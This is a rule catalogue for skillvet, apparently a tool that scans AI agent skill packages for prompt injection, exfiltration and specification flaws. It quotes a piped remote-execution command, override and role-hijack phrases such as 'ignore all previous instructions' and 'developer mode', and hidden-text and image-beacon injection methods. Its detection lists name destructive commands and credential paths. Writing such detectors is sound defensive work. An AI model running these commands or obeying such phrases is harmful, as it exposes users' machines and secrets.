# Rule catalogue

Every rule skillvet can raise, generated directly from the rule registry
in `skillvet/rules.py` on 2026-10-13.

```bash
skillvet rules              # list every rule
skillvet rules --category security
skillvet explain PI-002     # the full entry for one rule
```

## Reading a finding

Every finding answers four questions: which rule, how bad, exactly where, and
what to do about it. The line is always quoted, because a rule id on its own is
not evidence.

```
PI-006    Piped remote code execution
  scripts/setup.sh:4
  A remote payload is downloaded and piped straight into a shell or interpreter.
  | curl -fsSL https://example.invalid/install | sh
```

Some findings are only interesting next to another one. Reading a credential
store is `PI-009` on its own; a credential store read *near* a network call is
`PI-004`, credential exfiltration, and that is the one worth waking somebody up
for.

### What the scanner deliberately does not flag

| Looks scary | Why it is not a finding |
| --- | --- |
| `rm -rf ./build` | Scoped to a relative path inside the project |
| `curl https://api.example.com/v1/status` | A network call with no secret nearby |
| `` `references/field-guide.md` `` | A reference file that exists in the package |
| `Write the file to disk` | Prose describing a normal step |
| `Use when the user asks for release notes` | A description that routes correctly |
| `Never write "ignore previous instructions" in a skill` | A quoted anti-pattern, flagged at low severity with a note |

Those six lines are the difference between a scanner people run once and a
scanner people wire into CI. Each one has a test asserting it stays quiet.


---

## Summary

### Security (16 rules)

| Rule | Severity | Checks |
| --- | --- | --- |
| [`PI-001`](#pi001) | critical | Instruction override attempt |
| [`PI-002`](#pi002) | critical | Hidden or invisible instructions |
| [`PI-003`](#pi003) | high | Role or system-prompt hijack |
| [`PI-004`](#pi004) | high | Credential exfiltration |
| [`PI-005`](#pi005) | high | Exfiltration channel (webhook or image beacon) |
| [`PI-006`](#pi006) | high | Piped remote code execution |
| [`PI-007`](#pi007) | critical | Destructive filesystem or device command |
| [`PI-008`](#pi008) | medium | Hard-coded credential in the package |
| [`PI-009`](#pi009) | medium | Sensitive file or keychain access |
| [`PI-010`](#pi010) | high | Obfuscated or encoded payload |
| [`PI-011`](#pi011) | medium | Unpinned remote fetch during activation |
| [`PI-012`](#pi012) | high | Agent-configuration tampering |
| [`PI-013`](#pi013) | medium | Privilege escalation or persistence |
| [`PI-014`](#pi014) | high | Suppressed user confirmation |
| [`PI-015`](#pi015) | medium | Irreversible operation without a guard |
| [`PI-016`](#pi016) | info | Network egress inventory |

### Specification (14 rules)

| Rule | Severity | Checks |
| --- | --- | --- |
| [`SPEC-001`](#spec001) | critical | Missing SKILL.md |
| [`SPEC-002`](#spec002) | critical | Missing YAML frontmatter |
| [`SPEC-003`](#spec003) | high | Frontmatter is not valid YAML |
| [`SPEC-004`](#spec004) | high | Required field 'name' is missing |
| [`SPEC-005`](#spec005) | high | Required field 'description' is missing |
| [`SPEC-006`](#spec006) | medium | description exceeds 1024 characters |
| [`SPEC-007`](#spec007) | medium | name is not a valid skill identifier |
| [`SPEC-008`](#spec008) | low | name does not match the directory name |
| [`SPEC-009`](#spec009) | low | Unknown frontmatter key |
| [`SPEC-010`](#spec010) | medium | Body exceeds a comfortable context budget |
| [`SPEC-011`](#spec011) | medium | Referenced file does not exist |
| [`SPEC-012`](#spec012) | high | File escapes the skill directory |
| [`SPEC-013`](#spec013) | low | Non-UTF8 content, BOM or CRLF line endings |
| [`SPEC-014`](#spec014) | low | No license declared |

### Quality (10 rules)

| Rule | Severity | Checks |
| --- | --- | --- |
| [`Q-001`](#q001) | high | description does not state when to use the skill |
| [`Q-002`](#q002) | medium | description is vague or written in the wrong voice |
| [`Q-003`](#q003) | medium | No worked example |
| [`Q-004`](#q004) | high | No progressive disclosure |
| [`Q-005`](#q005) | medium | No scope boundaries or failure handling |
| [`Q-006`](#q006) | low | Hedged or non-imperative instructions |
| [`Q-007`](#q007) | medium | Bundled scripts are never referenced |
| [`Q-008`](#q008) | medium | No success criteria or output contract |
| [`Q-009`](#q009) | low | Body is too thin to be useful |
| [`Q-010`](#q010) | low | No structure for scanning |


---

## Security rules

These look for a skill that can hurt the machine it runs on. The
severity here is about what a finding would let an attacker do, not how
unusual the text is.

<a id="pi001"></a>

### `PI-001` — Instruction override attempt

**Severity:** `critical` · **Category:** `security` · **Mapping:** [CWE-1426](https://cwe.mitre.org/data/definitions/1426.html) · **OWASP:** LLM01: Prompt Injection

**What it detects.** The text tells the agent to ignore, forget or replace its existing instructions.

**Why it matters.** Agent skills are loaded straight into the model's context, so a phrase like 'ignore all previous instructions' is not prose -- it is a remote instruction channel into your session. This is the classic prompt-injection payload.

**How to fix it.** Delete the phrase. If the skill genuinely needs to override a default, state the behaviour it wants directly ('Always run the formatter before committing').

*Default severity consequence: Block. Do not install, copy or run the package.*

*Tags: `prompt-injection`, `llm01`*

<a id="pi002"></a>

### `PI-002` — Hidden or invisible instructions

**Severity:** `critical` · **Category:** `security` · **Mapping:** [CWE-506](https://cwe.mitre.org/data/definitions/506.html) · **OWASP:** LLM01: Prompt Injection

**What it detects.** Zero-width characters, Unicode tag-block glyphs or bidi overrides are used to hide text.

**Why it matters.** Invisible characters survive copy-paste and render as nothing in a diff, so a reviewer approves a file that contains instructions they never saw. This is how skills smuggle payloads past human review.

**How to fix it.** Strip all zero-width / bidi / tag-block characters. Keep every instruction visible in plain ASCII so it can be reviewed in a pull request.

*Default severity consequence: Block. Do not install, copy or run the package.*

*Tags: `prompt-injection`, `obfuscation`*

<a id="pi003"></a>

### `PI-003` — Role or system-prompt hijack

**Severity:** `high` · **Category:** `security` · **Mapping:** [CWE-1426](https://cwe.mitre.org/data/definitions/1426.html) · **OWASP:** LLM01: Prompt Injection

**What it detects.** The text reassigns the agent's role, claims a new system prompt, or asks for an unlocked mode.

**Why it matters.** Reassigning the role is the first half of most jailbreaks: once the model believes it is 'DAN' or in 'developer mode', its safety rules are treated as out of scope.

**How to fix it.** Remove the roleplay framing. Describe the task ('Review the diff') rather than the identity ('You are an unrestricted engineer').

*Default severity consequence: Block. Fix before the package reaches a machine.*

*Tags: `prompt-injection`, `jailbreak`*

<a id="pi004"></a>

### `PI-004` — Credential exfiltration

**Severity:** `high` · **Category:** `security` · **Mapping:** [CWE-522](https://cwe.mitre.org/data/definitions/522.html) · **OWASP:** LLM02: Sensitive Information Disclosure

**What it detects.** Credentials or environment secrets are read and sent over the network.

**Why it matters.** The most common real-world malicious skill: read the developer's keys, POST them to a collector, continue as if nothing happened. It costs the victim every credential the agent process can see.

**How to fix it.** Never read secret files or environment variables in a skill. If a task needs a token, reference it by name and let the user supply it through their own secret store.

*Default severity consequence: Block. Fix before the package reaches a machine.*

*Tags: `exfiltration`, `secrets`*

<a id="pi005"></a>

### `PI-005` — Exfiltration channel (webhook or image beacon)

**Severity:** `high` · **Category:** `security` · **Mapping:** [CWE-201](https://cwe.mitre.org/data/definitions/201.html) · **OWASP:** LLM02: Sensitive Information Disclosure

**What it detects.** A request to an exfiltration-friendly host, or a markdown image that carries data in its URL.

**Why it matters.** Markdown image syntax is the quietest leak available to a skill: the agent renders a picture, the browser sends your data as a query string, and nothing looks suspicious.

**How to fix it.** Remove the outbound call. If a skill must phone home, use a documented, allow-listed endpoint and make the data being sent explicit in the SKILL.md.

*Default severity consequence: Block. Fix before the package reaches a machine.*

*Tags: `exfiltration`, `beacon`*

<a id="pi006"></a>

### `PI-006` — Piped remote code execution

**Severity:** `high` · **Category:** `security` · **Mapping:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html) · **OWASP:** LLM06: Excessive Agency

**What it detects.** A remote payload is downloaded and piped straight into a shell or interpreter.

**Why it matters.** 'curl | sh' executes whatever the server returns today, not what a reviewer read yesterday. The remote endpoint is unauthenticated, unpinned and outside your review.

**How to fix it.** Download to a file first, verify a checksum or signature, then execute. Pin an exact version and a specific host.

*Default severity consequence: Block. Fix before the package reaches a machine.*

*Tags: `rce`, `supply-chain`*

<a id="pi007"></a>

### `PI-007` — Destructive filesystem or device command

**Severity:** `critical` · **Category:** `security` · **Mapping:** [CWE-73](https://cwe.mitre.org/data/definitions/73.html) · **OWASP:** LLM06: Excessive Agency

**What it detects.** A command that can destroy data outside the working directory (rm -rf /, mkfs, dd to a device, fork bomb).

**Why it matters.** Agents run commands with the user's full privileges. A single 'helpful' cleanup line can delete a home directory or wipe a disk, and there is no undo.

**How to fix it.** Scope every delete to a specific, explicit path and guard it ('refuse if the path is not inside the project root'). Never write device-level commands into a skill.

*Default severity consequence: Block. Do not install, copy or run the package.*

*Tags: `destructive`*

<a id="pi008"></a>

### `PI-008` — Hard-coded credential in the package

**Severity:** `medium` · **Category:** `security` · **Mapping:** [CWE-798](https://cwe.mitre.org/data/definitions/798.html) · **OWASP:** LLM02: Sensitive Information Disclosure

**What it detects.** A live-looking API key, token or private key is embedded in a file.

**Why it matters.** Skills are frequently forked, vendored and republished. A key committed inside one leaks the moment the package is cloned, and the leak is invisible to the original author.

**How to fix it.** Revoke the key, then remove it from the file and read it from the environment instead. Add a .gitignore entry and a pre-commit secret scanner.

*Default severity consequence: Review. Understand the finding before deciding.*

*Tags: `secrets`*

<a id="pi009"></a>

### `PI-009` — Sensitive file or keychain access

**Severity:** `medium` · **Category:** `security` · **Mapping:** [CWE-522](https://cwe.mitre.org/data/definitions/522.html) · **OWASP:** LLM02: Sensitive Information Disclosure

**What it detects.** The skill reads credential stores such as ~/.ssh, ~/.aws, .env, .netrc or the OS keychain.

**Why it matters.** Reading these paths is rarely part of a legitimate skill and is the reconnaissance step that precedes exfiltration. Even a benign read pulls secrets into the model's context, where they persist for the rest of the session.

**How to fix it.** Keep secrets out of the agent's context entirely. Pass a single-purpose, short-lived token through an environment variable when a task truly needs it.

*Default severity consequence: Review. Understand the finding before deciding.*

*Tags: `secrets`, `recon`*

<a id="pi010"></a>

### `PI-010` — Obfuscated or encoded payload

**Severity:** `high` · **Category:** `security` · **Mapping:** [CWE-506](https://cwe.mitre.org/data/definitions/506.html) · **OWASP:** LLM01: Prompt Injection

**What it detects.** Base64, hex or char-code blobs are decoded and executed, or an encoded instruction is supplied.

**Why it matters.** Obfuscation exists to defeat review. Legitimate skills do not need to hide their instructions behind an encoder, and 'decode this and do it' is the same payload with extra steps.

**How to fix it.** Replace the blob with readable source. If binary data is genuinely required, ship it as a reviewed asset file with a documented format.

*Default severity consequence: Block. Fix before the package reaches a machine.*

*Tags: `obfuscation`*

<a id="pi011"></a>

### `PI-011` — Unpinned remote fetch during activation

**Severity:** `medium` · **Category:** `security` · **Mapping:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html) · **OWASP:** LLM05: Supply Chain

**What it detects.** The skill downloads or installs code from the network while it activates.

**Why it matters.** Activation-time fetches make a skill's behaviour change without any commit in your repo. It also turns every run into a network dependency and a supply-chain trust decision.

**How to fix it.** Vendor what you need into the skill, or pin an exact version and verify a checksum.

*Default severity consequence: Review. Understand the finding before deciding.*

*Tags: `supply-chain`*

<a id="pi012"></a>

### `PI-012` — Agent-configuration tampering

**Severity:** `high` · **Category:** `security` · **Mapping:** [CWE-15](https://cwe.mitre.org/data/definitions/15.html) · **OWASP:** LLM06: Excessive Agency

**What it detects.** The skill edits agent settings, hooks, permissions or global instruction files.

**Why it matters.** Writing to CLAUDE.md, AGENTS.md, settings.json or a hook turns a one-shot review into persistence: the payload survives the session, applies to every future project, and may disable the permission prompts that would have stopped it.

**How to fix it.** Skills must not modify agent configuration. Ask the user to apply configuration changes themselves, and never enable bypass-permissions modes.

*Default severity consequence: Block. Fix before the package reaches a machine.*

*Tags: `persistence`*

<a id="pi013"></a>

### `PI-013` — Privilege escalation or persistence

**Severity:** `medium` · **Category:** `security` · **Mapping:** [CWE-269](https://cwe.mitre.org/data/definitions/269.html) · **OWASP:** LLM06: Excessive Agency

**What it detects.** Privilege escalation (sudo, setuid, containers) or a scheduled task is installed.

**Why it matters.** Privilege escalation converts a skill-level compromise into a machine-level one, and a cron or systemd entry keeps it there after the session ends.

**How to fix it.** Run without elevated privileges. If a step needs root, document it as a manual step the user performs deliberately.

*Default severity consequence: Review. Understand the finding before deciding.*

*Tags: `persistence`, `escalation`*

<a id="pi014"></a>

### `PI-014` — Suppressed user confirmation

**Severity:** `high` · **Category:** `security` · **Mapping:** [CWE-693](https://cwe.mitre.org/data/definitions/693.html) · **OWASP:** LLM06: Excessive Agency

**What it detects.** The skill instructs the agent not to ask, not to warn, or to hide what it did.

**Why it matters.** Concealment is the clearest malicious signal in the whole catalogue. A skill that tells the agent to act silently is buying speed with the user's ability to stop it.

**How to fix it.** Keep the user in the loop for anything destructive, expensive, or outbound. Explicitly document where the skill pauses for approval.

*Default severity consequence: Block. Fix before the package reaches a machine.*

*Tags: `agency`, `stealth`*

<a id="pi015"></a>

### `PI-015` — Irreversible operation without a guard

**Severity:** `medium` · **Category:** `security` · **Mapping:** [CWE-693](https://cwe.mitre.org/data/definitions/693.html) · **OWASP:** LLM06: Excessive Agency

**What it detects.** Force-push, hard reset, destructive SQL, infrastructure teardown or recursive delete with no confirmation step.

**Why it matters.** These are exactly the commands an over-eager agent runs on a bad interpretation. The damage is not recoverable, and the skill leaves no explicit checkpoint for the human.

**How to fix it.** Add an explicit confirmation step, use dry-run flags first, and state what must be true before the command may run.

*Default severity consequence: Review. Understand the finding before deciding.*

*Tags: `destructive`*

<a id="pi016"></a>

### `PI-016` — Network egress inventory

**Severity:** `info` · **Category:** `security`

**What it detects.** Informational: hosts this skill contacts.

**Why it matters.** Even a clean skill has a network surface. Listing it lets a reviewer answer 'what does this talk to?' without reading every line.

**How to fix it.** Confirm each host is one you expect. Prefer first-party or allow-listed endpoints.

*Default severity consequence: Informational. No penalty, no action required.*

*Tags: `inventory`*

## Specification rules

These decide whether a skill loads at all. A skill that fails a critical
spec rule is inert: the agent never sees it, and nobody notices until the
task that needed it silently does nothing.

<a id="spec001"></a>

### `SPEC-001` — Missing SKILL.md

**Severity:** `critical` · **Category:** `spec`

**What it detects.** No SKILL.md exists at the root of this directory.

**Why it matters.** SKILL.md is the entry point the Agent Skills standard defines. Without it there is nothing for an agent to load and nothing for a reviewer to read.

**How to fix it.** Create SKILL.md at the skill root. Run 'skillvet init' to scaffold a valid one.

*Default severity consequence: Block. Do not install, copy or run the package.*

<a id="spec002"></a>

### `SPEC-002` — Missing YAML frontmatter

**Severity:** `critical` · **Category:** `spec`

**What it detects.** The file does not open with a '---' fenced YAML block.

**Why it matters.** name and description live in frontmatter. Without it an agent cannot discover or route the skill, so the package silently never activates.

**How to fix it.** Start the file with '---', then name and description, then a closing '---'.

*Default severity consequence: Block. Do not install, copy or run the package.*

<a id="spec003"></a>

### `SPEC-003` — Frontmatter is not valid YAML

**Severity:** `high` · **Category:** `spec`

**What it detects.** The frontmatter block could not be parsed.

**Why it matters.** A malformed block means the fields are never read. Most real cases are a missing quote, a tab character, or a colon inside an unquoted value.

**How to fix it.** Quote any value containing ':' or '#', use spaces (never tabs) for indentation, and re-run 'skillvet scan' until the parse error clears.

*Default severity consequence: Block. Fix before the package reaches a machine.*

<a id="spec004"></a>

### `SPEC-004` — Required field 'name' is missing

**Severity:** `high` · **Category:** `spec`

**What it detects.** Frontmatter has no name field.

**Why it matters.** name is how other tools, marketplaces and registries identify the package.

**How to fix it.** Add 'name: <kebab-case-name>' as the first frontmatter key.

*Default severity consequence: Block. Fix before the package reaches a machine.*

<a id="spec005"></a>

### `SPEC-005` — Required field 'description' is missing

**Severity:** `high` · **Category:** `spec`

**What it detects.** Frontmatter has no description field.

**Why it matters.** description is the only text the agent reads when deciding whether to load a skill. Without it the skill is inert.

**How to fix it.** Add a one-to-three sentence description that says what the skill does and when to use it.

*Default severity consequence: Block. Fix before the package reaches a machine.*

<a id="spec006"></a>

### `SPEC-006` — description exceeds 1024 characters

**Severity:** `medium` · **Category:** `spec`

**What it detects.** The description is longer than the standard's limit.

**Why it matters.** Over-long descriptions are truncated by some hosts, which can cut off the trigger condition -- the most important sentence in the file.

**How to fix it.** Move detail into the body and keep the description under 1024 characters.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="spec007"></a>

### `SPEC-007` — name is not a valid skill identifier

**Severity:** `medium` · **Category:** `spec`

**What it detects.** name is not lowercase kebab-case, contains invalid characters, or is longer than 64 characters.

**Why it matters.** Clients normalise names to locate the skill directory; invalid characters break discovery and produce duplicate-looking entries in marketplaces.

**How to fix it.** Use lowercase letters, digits and single hyphens, 64 characters or fewer, matching the directory name.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="spec008"></a>

### `SPEC-008` — name does not match the directory name

**Severity:** `low` · **Category:** `spec`

**What it detects.** The name field and the containing directory disagree.

**Why it matters.** Most installers copy the directory, so the mismatch is invisible locally and confusing once the skill is published.

**How to fix it.** Rename the directory to match name, or update name to match the directory.

*Default severity consequence: Fix when convenient. Style and hygiene.*

<a id="spec009"></a>

### `SPEC-009` — Unknown frontmatter key

**Severity:** `low` · **Category:** `spec`

**What it detects.** A frontmatter key is not part of the standard and is probably a typo.

**Why it matters.** Typos ('discription', 'allowed_tools') are read as absent, so a security control like allowed-tools silently does not apply.

**How to fix it.** Remove the key or correct it to the documented spelling.

*Default severity consequence: Fix when convenient. Style and hygiene.*

<a id="spec010"></a>

### `SPEC-010` — Body exceeds a comfortable context budget

**Severity:** `medium` · **Category:** `spec`

**What it detects.** SKILL.md is large enough to consume a significant share of the context window.

**Why it matters.** Skills that dump everything into SKILL.md force the agent to hold reference material it does not need for the current task, which crowds out the actual work.

**How to fix it.** Keep SKILL.md under a few hundred lines and move depth into reference files that the body points to, loaded only when needed.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="spec011"></a>

### `SPEC-011` — Referenced file does not exist

**Severity:** `medium` · **Category:** `spec`

**What it detects.** The body points at a bundled file that is not present.

**Why it matters.** Broken references are the most common way a skill fails at runtime, and the failure is confusing because the instructions read as if they should work.

**How to fix it.** Either add the missing file or fix the path. Paths are relative to the skill root.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="spec012"></a>

### `SPEC-012` — File escapes the skill directory

**Severity:** `high` · **Category:** `spec`

**What it detects.** A bundled file is a symlink or path that resolves outside the skill root.

**Why it matters.** Path escapes let a package read or overwrite files elsewhere on the machine while looking like a self-contained folder.

**How to fix it.** Ship a real copy inside the skill directory instead of a link or relative escape.

*Default severity consequence: Block. Fix before the package reaches a machine.*

<a id="spec013"></a>

### `SPEC-013` — Non-UTF8 content, BOM or CRLF line endings

**Severity:** `low` · **Category:** `spec`

**What it detects.** The file has an encoding or line-ending quirk.

**Why it matters.** Strict parsers and some Windows tooling choke on a BOM or mixed line endings, which turns into a mystery 'invalid frontmatter' report upstream.

**How to fix it.** Save as UTF-8 without BOM and use LF line endings.

*Default severity consequence: Fix when convenient. Style and hygiene.*

<a id="spec014"></a>

### `SPEC-014` — No license declared

**Severity:** `low` · **Category:** `spec`

**What it detects.** Neither frontmatter nor the repository declares a license.

**Why it matters.** Skills are copied, vendored and republished. Without a license nobody can legally reuse the package, which caps its adoption.

**How to fix it.** Add 'license: MIT' to frontmatter and include a LICENSE file at the repository root.

*Default severity consequence: Fix when convenient. Style and hygiene.*

## Quality rules

These decide whether a skill *works*. A skill can be perfectly safe and
completely useless -- usually because its description never states when it
should fire.

<a id="q001"></a>

### `Q-001` — description does not state when to use the skill

**Severity:** `high` · **Category:** `quality`

**What it detects.** The description explains the topic but not the trigger condition.

**Why it matters.** Routing is the description's whole job. 'Helps with databases' never fires; 'Use when the task involves writing or reviewing SQL migrations' fires reliably.

**How to fix it.** Add an explicit trigger, ideally phrased 'Use when ...'. Front-load the words a user would actually type.

*Default severity consequence: Block. Fix before the package reaches a machine.*

<a id="q002"></a>

### `Q-002` — description is vague or written in the wrong voice

**Severity:** `medium` · **Category:** `quality`

**What it detects.** The description is promotional, first-person, or too generic to route on.

**Why it matters.** Descriptions are matched against real tasks. Marketing language ('supercharge your workflow') carries no signal, and first person ('I can help you') collides with the agent's own identity.

**How to fix it.** Write in the third person about the capability: 'Extracts invoice totals from PDFs into CSV.' Say what it does, not how good it is.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="q003"></a>

### `Q-003` — No worked example

**Severity:** `medium` · **Category:** `quality`

**What it detects.** The body contains no example of input and expected output.

**Why it matters.** Examples are the highest-signal part of a skill: they pin down the output shape and stop the agent from inventing its own format.

**How to fix it.** Add a short example block showing a realistic request and the expected result.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="q004"></a>

### `Q-004` — No progressive disclosure

**Severity:** `high` · **Category:** `quality`

**What it detects.** The body is long but bundles no reference files.

**Why it matters.** The standard expects a small SKILL.md plus optional reference material loaded on demand. A single long file is paid for on every single turn, whether or not it is relevant.

**How to fix it.** Move deep reference material into files next to SKILL.md and link them from the body, keeping only the routing information and the core procedure inline.

*Default severity consequence: Block. Fix before the package reaches a machine.*

<a id="q005"></a>

### `Q-005` — No scope boundaries or failure handling

**Severity:** `medium` · **Category:** `quality`

**What it detects.** The skill never says when it should not be used, or what to do when a step fails.

**Why it matters.** Skills that cannot fail gracefully will improvise. An explicit boundary is what stops an agent from 'helpfully' continuing after the input did not match expectations.

**How to fix it.** Add a short section covering when not to use the skill and how to stop and report when a precondition is not met.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="q006"></a>

### `Q-006` — Hedged or non-imperative instructions

**Severity:** `low` · **Category:** `quality`

**What it detects.** Instructions use hedges such as 'try to', 'maybe', 'if possible', or 'consider'.

**Why it matters.** Hedged instructions are treated as optional by the model, so behaviour drifts between runs and the skill feels unreliable.

**How to fix it.** Use direct imperatives: 'Run', 'Write', 'Refuse'. Reserve hedges for genuine edge cases.

*Default severity consequence: Fix when convenient. Style and hygiene.*

<a id="q007"></a>

### `Q-007` — Bundled scripts are never referenced

**Severity:** `medium` · **Category:** `quality`

**What it detects.** Executable files ship in the package but the body never mentions them.

**Why it matters.** Unreferenced scripts are unreviewed scripts: they still get executed when the agent explores the directory, but no human ever read them.

**How to fix it.** Link each script from SKILL.md with a sentence explaining when to run it, or delete it.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="q008"></a>

### `Q-008` — No success criteria or output contract

**Severity:** `medium` · **Category:** `quality`

**What it detects.** The skill does not define what a correct result looks like.

**Why it matters.** Without an output contract every run produces a different shape, which breaks anything downstream and makes the skill hard to trust.

**How to fix it.** State the expected output format and the conditions for calling the task done.

*Default severity consequence: Review. Understand the finding before deciding.*

<a id="q009"></a>

### `Q-009` — Body is too thin to be useful

**Severity:** `low` · **Category:** `quality`

**What it detects.** The body is only a few lines, so the skill is a stub rather than a procedure.

**Why it matters.** A skill with no procedure just restates what the model already does, adding context cost for no gain.

**How to fix it.** Add the actual steps, decision points and examples that make this skill worth loading.

*Default severity consequence: Fix when convenient. Style and hygiene.*

<a id="q010"></a>

### `Q-010` — No structure for scanning

**Severity:** `low` · **Category:** `quality`

**What it detects.** The body has no headings, so an agent cannot navigate to the relevant part.

**Why it matters.** Headings are how both humans and models locate the one section they need, and how progressive disclosure stays possible as the skill grows.

**How to fix it.** Add short descriptive headings: 'When to use', 'Procedure', 'Examples', 'Failure modes'.

*Default severity consequence: Fix when convenient. Style and hygiene.*

---

## Adding a rule

Rules live in `skillvet/rules.py` as declarative entries; detection lives in
`skillvet/security.py`, `skillvet/spec.py` or `skillvet/quality.py`. A new
security pattern needs four things: the rule entry, the pattern, a positive
test, and a negative test proving it stays quiet on benign input. See
[CONTRIBUTING.md](../CONTRIBUTING.md).
